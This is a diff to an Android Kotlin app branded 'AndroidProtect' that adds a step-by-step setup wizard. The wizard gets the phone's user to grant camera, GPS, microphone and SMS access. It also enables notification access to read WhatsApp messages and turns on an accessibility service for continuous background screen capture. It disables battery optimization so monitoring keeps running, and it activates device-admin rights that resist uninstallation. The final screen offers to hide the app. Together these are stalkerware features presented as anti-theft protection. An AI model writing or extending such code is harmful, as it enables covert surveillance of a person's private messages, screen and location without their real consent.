@@ -56,7 +56,7 @@ import java.net.URL
 
 private const val SERVER_HOST = "androidprotect.appbr.pro"
 
-private enum class Screen { LOGIN, AUTH_GATE, SETUP }
+private enum class Screen { LOGIN, AUTH_GATE, SETUP, WIZARD }
 
 class MainActivity : ComponentActivity() {
 
@@ -151,7 +151,14 @@ class MainActivity : ComponentActivity() {
 
         when (screen) {
             Screen.AUTH_GATE -> AuthGateScreen(onUnlocked = { screen = Screen.SETUP })
-            Screen.LOGIN     -> LoginScreen(onLinked = { screen = Screen.SETUP })
+            Screen.LOGIN     -> LoginScreen(onLinked = {
+                // Show wizard only the first time (wizard_done not set yet)
+                screen = if (!prefs.getBoolean("wizard_done", false)) Screen.WIZARD else Screen.SETUP
+            })
+            Screen.WIZARD    -> WizardScreen(onDone = {
+                prefs.edit().putBoolean("wizard_done", true).apply()
+                screen = Screen.SETUP
+            })
             Screen.SETUP     -> SetupScreen(onUnlink = {
                 prefs.edit().remove("link_token").remove("user_email").apply()
                 AntiTheftService.linkToken = ""
@@ -1080,6 +1087,438 @@ class MainActivity : ComponentActivity() {
             }
 
             Spacer(Modifier.height(24.dp))
+        }
+    }
+
+    // ═══════════════════════════════════════════════════════════════════════
+    // WIZARD SCREEN — configuração automática passo a passo
+    // ═══════════════════════════════════════════════════════════════════════
+    @Composable
+    fun WizardScreen(onDone: () -> Unit) {
+        val context = this
+
+        // Steps: 0=welcome 1=runtime 2=notify_listener 3=accessibility 4=battery 5=admin 6=done
+        var step by remember { mutableStateOf(0) }
+        var runtimeLaunched by remember { mutableStateOf(false) }
+        var showNextAfterRuntime by remember { mutableStateOf(false) }
+
+        val hasNotify          by hasWhatsAppListenerState
+        val hasAccessibility   by hasAccessibilityState
+        val hasAdmin           by hasAdminState
+        val hasLocation        by hasLocationState
+        val hasCamera          by hasCameraState
+        val hasMic             by hasMicState
+
+        // Step 1: auto-launch runtime permissions once
+        LaunchedEffect(step) {
+            if (step == 1 && !runtimeLaunched) {
+                runtimeLaunched = true
+                startPermissionFlow()
+                // Show "Próximo" button after 3s so user doesn't get stuck
+                delay(3000)
+                showNextAfterRuntime = true
+            }
+        }
+
+        // Step 2: auto-advance as soon as notification listener is enabled
+        LaunchedEffect(hasNotify) {
+            if (step == 2 && hasNotify) {
+                delay(600)
+                step = 3
+            }
+        }
+
+        // Step 3: auto-advance as soon as accessibility is enabled
+        LaunchedEffect(hasAccessibility) {
+            if (step == 3 && hasAccessibility) {
+                delay(600)
+                step = 4
+            }
+        }
+
+        Column(
+            modifier = Modifier
+                .fillMaxSize()
+                .background(Color(0xFF0A0B10))
+                .verticalScroll(rememberScrollState())
+                .padding(horizontal = 24.dp),
+            horizontalAlignment = Alignment.CenterHorizontally
+        ) {
+            Spacer(Modifier.height(48.dp))
+
+            // ── Logo ──────────────────────────────────────────────────────
+            Box(
+                Modifier
+                    .size(80.dp)
+                    .background(Color(0xFF0D1826), RoundedCornerShape(24.dp))
+                    .border(1.5.dp, Color(0xFF00D2FF).copy(alpha = 0.4f), RoundedCornerShape(24.dp)),
+                Alignment.Center
+            ) { Text("🛡️", fontSize = 38.sp) }
+
+            Spacer(Modifier.height(14.dp))
+            Text("Configuração Automática", fontSize = 22.sp, fontWeight = FontWeight.Bold, color = Color(0xFF00D2FF))
+
+            // ── Progress bar ──────────────────────────────────────────────
+            Spacer(Modifier.height(20.dp))
+            val totalSteps = 6 // steps 0-5 are setup, step 6 is done
+            val progress = if (step >= totalSteps) 1f else step / totalSteps.toFloat()
+            Box(
+                Modifier
+                    .fillMaxWidth()
+                    .height(6.dp)
+                    .background(Color(0xFF1E2235), RoundedCornerShape(3.dp))
+            ) {
+                Box(
+                    Modifier
+                        .fillMaxWidth(progress)
+                        .height(6.dp)
+                        .background(Color(0xFF00D2FF), RoundedCornerShape(3.dp))
+                )
+            }
+            Spacer(Modifier.height(8.dp))
+            Text(
+                if (step < totalSteps) "Passo ${step + 1} de $totalSteps" else "Concluído!",
+                color = Color(0xFF8E94A5), fontSize = 11.sp
+            )
+            Spacer(Modifier.height(24.dp))
+
+            // ── Step content ──────────────────────────────────────────────
+            Card(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .border(1.dp, Color(0xFF252630), RoundedCornerShape(20.dp)),
+                colors = CardDefaults.cardColors(containerColor = Color(0xFF12141D)),
+                shape = RoundedCornerShape(20.dp)
+            ) {
+                Column(Modifier.padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
+
+                    when (step) {
+
+                        // ── Passo 0: Boas-vindas ──────────────────────────────────
+                        0 -> {
+                            Text("👋", fontSize = 42.sp)
+                            Spacer(Modifier.height(12.dp))
+                            Text("Tudo automático!", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center)
+                            Spacer(Modifier.height(10.dp))
+                            Text(
+                                "O app vai solicitar todas as permissões necessárias automaticamente.\n\nVocê precisará tocar em apenas 4 a 6 botões no total. Siga as instruções de cada passo.",
+                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
+                            )
+                            Spacer(Modifier.height(8.dp))
+                            // Preview das etapas
+                            listOf(
+                                "📋" to "Permissões básicas (câmera, GPS, microfone…)",
+                                "💬" to "Monitoramento do WhatsApp",
+                                "♿" to "Captura de tela contínua",
+                                "🔋" to "Proteção contra suspensão de bateria",
+                                "⚙️" to "Administrador do dispositivo"
+                            ).forEach { (emoji, label) ->
+                                Row(
+                                    Modifier.fillMaxWidth().padding(vertical = 4.dp),
+                                    verticalAlignment = Alignment.CenterVertically
+                                ) {
+                                    Text(emoji, fontSize = 16.sp, modifier = Modifier.width(28.dp))
+                                    Text(label, color = Color(0xFF8E94A5), fontSize = 12.sp, lineHeight = 16.sp)
+                                }
+                            }
+                            Spacer(Modifier.height(20.dp))
+                            Button(
+                                onClick = { step = 1 },
+                                modifier = Modifier.fillMaxWidth().height(52.dp),
+                                shape = RoundedCornerShape(14.dp),
+                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
+                            ) {
+                                Text("▶  Iniciar configuração", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp)
+                            }
+                            Spacer(Modifier.height(10.dp))
+                            TextButton(onClick = { onDone() }) {
+                                Text("Pular configuração", color = Color(0xFF8E94A5), fontSize = 12.sp)
+                            }
+                        }
+
+                        // ── Passo 1: Permissões de runtime ───────────────────────
+                        1 -> {
+                            Text("📋", fontSize = 42.sp)
+                            Spacer(Modifier.height(12.dp))
+                            Text("Permissões Básicas", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center)
+                            Spacer(Modifier.height(10.dp))
+                            Text(
+                                "Os diálogos de permissão abrirão automaticamente.\n\nToque em \"Permitir\" em cada diálogo que aparecer para liberar câmera, GPS, microfone, SMS e mais.",
+                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
+                            )
+                            Spacer(Modifier.height(18.dp))
+                            if (!showNextAfterRuntime && !(hasLocation && hasCamera && hasMic)) {
+                                CircularProgressIndicator(
+                                    modifier = Modifier.size(36.dp),
+                                    color = Color(0xFF00D2FF),
+                                    strokeWidth = 3.dp
+                                )
+                                Spacer(Modifier.height(10.dp))
+                                Text("Aguardando permissões…", color = Color(0xFF8E94A5), fontSize = 12.sp)
+                            }
+                            if (showNextAfterRuntime || (hasLocation && hasCamera && hasMic)) {
+                                Spacer(Modifier.height(10.dp))
+                                Button(
+                                    onClick = { step = 2 },
+                                    modifier = Modifier.fillMaxWidth().height(52.dp),
+                                    shape = RoundedCornerShape(14.dp),
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
+                                ) {
+                                    Text("Próximo →", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp)
+                                }
+                            }
+                        }
+
+                        // ── Passo 2: Notification Listener (WhatsApp) ────────────
+                        2 -> {
+                            Text("💬", fontSize = 42.sp)
+                            Spacer(Modifier.height(12.dp))
+                            Text("Monitorar WhatsApp", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center)
+                            Spacer(Modifier.height(10.dp))
+                            Text(
+                                "Para ler mensagens do WhatsApp, o app precisa de acesso às notificações.",
+                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
+                            )
+                            Spacer(Modifier.height(14.dp))
+                            // Instruções passo a passo
+                            val notifySteps = listOf(
+                                "Toque em \"Abrir Configurações\" abaixo",
+                                "Encontre \"Protect\" na lista e ative o interruptor",
+                                "Confirme \"Permitir\" no diálogo que aparecer",
+                                "Volte para o app — avanço automático"
+                            )
+                            notifySteps.forEachIndexed { i, s ->
+                                Row(Modifier.fillMaxWidth().padding(vertical = 3.dp), verticalAlignment = Alignment.Top) {
+                                    Box(
+                                        Modifier
+                                            .size(20.dp)
+                                            .background(Color(0xFF25D366).copy(alpha = 0.2f), CircleShape),
+                                        Alignment.Center
+                                    ) { Text("${i+1}", color = Color(0xFF25D366), fontSize = 10.sp, fontWeight = FontWeight.Bold) }
+                                    Spacer(Modifier.width(8.dp))
+                                    Text(s, color = Color(0xFF8E94A5), fontSize = 12.sp, lineHeight = 17.sp, modifier = Modifier.weight(1f))
+                                }
+                            }
+                            Spacer(Modifier.height(18.dp))
+                            if (hasNotify) {
+                                Box(
+                                    Modifier.fillMaxWidth().background(Color(0xFF1A3024), RoundedCornerShape(10.dp)).padding(12.dp),
+                                    Alignment.Center
+                                ) {
+                                    Row(verticalAlignment = Alignment.CenterVertically) {
+                                        Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(18.dp))
+                                        Spacer(Modifier.width(8.dp))
+                                        Text("Acesso concedido! Avançando…", color = Color(0xFF39FF14), fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
+                                    }
+                                }
+                            } else {
+                                Button(
+                                    onClick = { startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)) },
+                                    modifier = Modifier.fillMaxWidth().height(52.dp),
+                                    shape = RoundedCornerShape(14.dp),
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF25D366))
+                                ) {
+                                    Text("Abrir Configurações", color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 15.sp)
+                                }
+                                Spacer(Modifier.height(10.dp))
+                                TextButton(onClick = { step = 3 }) {
+                                    Text("Pular esta etapa", color = Color(0xFF8E94A5), fontSize = 12.sp)
+                                }
+                            }
+                        }
+
+                        // ── Passo 3: Accessibility (captura de tela) ─────────────
+                        3 -> {
+                            Text("♿", fontSize = 42.sp)
+                            Spacer(Modifier.height(12.dp))
+                            Text("Captura de Tela Contínua", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center)
+                            Spacer(Modifier.height(10.dp))
+                            Text(
+                                "O serviço de Acessibilidade permite capturar a tela sem interrupção, mesmo com o app em segundo plano.",
+                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
+                            )
+                            Spacer(Modifier.height(14.dp))
+                            val a11ySteps = listOf(
+                                "Toque em \"Abrir Configurações\" abaixo",
+                                "Encontre \"Protect\" em Acessibilidade e toque",
+                                "Ative o interruptor e confirme \"Permitir\"",
+                                "Volte para o app — avanço automático"
+                            )
+                            a11ySteps.forEachIndexed { i, s ->
+                                Row(Modifier.fillMaxWidth().padding(vertical = 3.dp), verticalAlignment = Alignment.Top) {
+                                    Box(
+                                        Modifier
+                                            .size(20.dp)
+                                            .background(Color(0xFFB794F4).copy(alpha = 0.2f), CircleShape),
+                                        Alignment.Center
+                                    ) { Text("${i+1}", color = Color(0xFFB794F4), fontSize = 10.sp, fontWeight = FontWeight.Bold) }
+                                    Spacer(Modifier.width(8.dp))
+                                    Text(s, color = Color(0xFF8E94A5), fontSize = 12.sp, lineHeight = 17.sp, modifier = Modifier.weight(1f))
+                                }
+                            }
+                            Spacer(Modifier.height(18.dp))
+                            if (hasAccessibility) {
+                                Box(
+                                    Modifier.fillMaxWidth().background(Color(0xFF1A3024), RoundedCornerShape(10.dp)).padding(12.dp),
+                                    Alignment.Center
+                                ) {
+                                    Row(verticalAlignment = Alignment.CenterVertically) {
+                                        Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(18.dp))
+                                        Spacer(Modifier.width(8.dp))
+                                        Text("Acessibilidade ativa! Avançando…", color = Color(0xFF39FF14), fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
+                                    }
+                                }
+                            } else {
+                                Button(
+                                    onClick = { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) },
+                                    modifier = Modifier.fillMaxWidth().height(52.dp),
+                                    shape = RoundedCornerShape(14.dp),
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF7C3AED))
+                                ) {
+                                    Text("Abrir Configurações", color = Color.White, fontWeight = FontWeight.Bold, fontSize = 15.sp)
+                                }
+                                Spacer(Modifier.height(10.dp))
+                                TextButton(onClick = { step = 4 }) {
+                                    Text("Pular esta etapa", color = Color(0xFF8E94A5), fontSize = 12.sp)
+                                }
+                            }
+                        }
+
+                        // ── Passo 4: Bateria ─────────────────────────────────────
+                        4 -> {
+                            val isBatteryOk = !isBatteryOptimizedFor(context)
+                            Text("🔋", fontSize = 42.sp)
+                            Spacer(Modifier.height(12.dp))
+                            Text("Proteção de Bateria", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center)
+                            Spacer(Modifier.height(10.dp))
+                            Text(
+                                "Para que o monitoramento continue ativo com a tela desligada, é preciso desativar a otimização de bateria para este app.",
+                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
+                            )
+                            Spacer(Modifier.height(14.dp))
+                            val mfr = Build.MANUFACTURER.lowercase()
+                            val hint = when {
+                                "xiaomi" in mfr -> "Procure \"Protect\" na lista → toque → selecione \"Sem restrições\"."
+                                "samsung" in mfr -> "Confirme \"Permitir\" no diálogo ou encontre Protect na lista."
+                                else -> "Encontre \"Protect\" na lista e selecione \"Sem restrições\" ou \"Não otimizar\"."
+                            }
+                            Text(hint, color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp, textAlign = TextAlign.Center)
+                            Spacer(Modifier.height(18.dp))
+                            if (isBatteryOk) {
+                                Box(
+                                    Modifier.fillMaxWidth().background(Color(0xFF1A3024), RoundedCornerShape(10.dp)).padding(12.dp),
+                                    Alignment.Center
+                                ) {
+                                    Row(verticalAlignment = Alignment.CenterVertically) {
+                                        Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(18.dp))
+                                        Spacer(Modifier.width(8.dp))
+                                        Text("Bateria configurada!", color = Color(0xFF39FF14), fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
+                                    }
+                                }
+                                Spacer(Modifier.height(14.dp))
+                                Button(
+                                    onClick = { step = 5 },
+                                    modifier = Modifier.fillMaxWidth().height(52.dp),
+                                    shape = RoundedCornerShape(14.dp),
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
+                                ) { Text("Próximo →", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp) }
+                            } else {
+                                Button(
+                                    onClick = {
+                                        val ok = runCatching { startActivity(batteryOptimizationIntent()) }.isSuccess
+                                        if (!ok) runCatching { startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)) }
+                                    },
+                                    modifier = Modifier.fillMaxWidth().height(52.dp),
+                                    shape = RoundedCornerShape(14.dp),
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF39FF14))
+                                ) {
+                                    Text("⚡  Desativar Otimização", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 15.sp)
+                                }
+                                Spacer(Modifier.height(10.dp))
+                                TextButton(onClick = { step = 5 }) {
+                                    Text("Pular esta etapa", color = Color(0xFF8E94A5), fontSize = 12.sp)
+                                }
+                            }
+                        }
+
+                        // ── Passo 5: Administrador do dispositivo ────────────────
+                        5 -> {
+                            Text("⚙️", fontSize = 42.sp)
+                            Spacer(Modifier.height(12.dp))
+                            Text("Administrador do Dispositivo", fontSize = 18.sp, fontWeight = FontWeight.Bold, color = Color.White, textAlign = TextAlign.Center)
+                            Spacer(Modifier.height(10.dp))
+                            Text(
+                                "Permite bloquear ou limpar o celular remotamente pelo painel, e dificulta a desinstalação do app.",
+                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
+                            )
+                            Spacer(Modifier.height(18.dp))
+                            if (hasAdmin) {
+                                Box(
+                                    Modifier.fillMaxWidth().background(Color(0xFF1A3024), RoundedCornerShape(10.dp)).padding(12.dp),
+                                    Alignment.Center
+                                ) {
+                                    Row(verticalAlignment = Alignment.CenterVertically) {
+                                        Icon(Icons.Default.CheckCircle, null, tint = Color(0xFF39FF14), modifier = Modifier.size(18.dp))
+                                        Spacer(Modifier.width(8.dp))
+                                        Text("Administrador ativo!", color = Color(0xFF39FF14), fontWeight = FontWeight.SemiBold, fontSize = 13.sp)
+                                    }
+                                }
+                                Spacer(Modifier.height(14.dp))
+                                Button(
+                                    onClick = { step = 6 },
+                                    modifier = Modifier.fillMaxWidth().height(52.dp),
+                                    shape = RoundedCornerShape(14.dp),
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
+                                ) { Text("Concluir →", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp) }
+                            } else {
+                                Button(
+                                    onClick = {
+                                        adminLauncher.launch(
+                                            Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                                                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
+                                                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                                                    "Ativa proteção contra desinstalação e permite bloqueio/limpeza remota.")
+                                            }
+                                        )
+                                    },
+                                    modifier = Modifier.fillMaxWidth().height(52.dp),
+                                    shape = RoundedCornerShape(14.dp),
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF9900))
+                                ) {
+                                    Text("⚙️  Ativar Administrador", color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 15.sp)
+                                }
+                                Spacer(Modifier.height(10.dp))
+                                TextButton(onClick = { step = 6 }) {
+                                    Text("Pular esta etapa", color = Color(0xFF8E94A5), fontSize = 12.sp)
+                                }
+                            }
+                        }
+
+                        // ── Passo 6: Concluído ───────────────────────────────────
+                        else -> {
+                            Text("✅", fontSize = 48.sp)
+                            Spacer(Modifier.height(14.dp))
+                            Text("Tudo configurado!", fontSize = 20.sp, fontWeight = FontWeight.Bold, color = Color(0xFF39FF14), textAlign = TextAlign.Center)
+                            Spacer(Modifier.height(10.dp))
+                            Text(
+                                "O AndroidProtect está ativo e monitorando este dispositivo. Você pode ocultar o app agora ou ajustar configurações avançadas.",
+                                color = Color(0xFF8E94A5), fontSize = 13.sp, lineHeight = 20.sp, textAlign = TextAlign.Center
+                            )
+                            Spacer(Modifier.height(22.dp))
+                            Button(
+                                onClick = { onDone() },
+                                modifier = Modifier.fillMaxWidth().height(52.dp),
+                                shape = RoundedCornerShape(14.dp),
+                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
+                            ) {
+                                Text("Ver painel →", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 16.sp)
+                            }
+                        }
+                    }
+                }
+            }
+
+            Spacer(Modifier.height(40.dp))
         }
     }
 
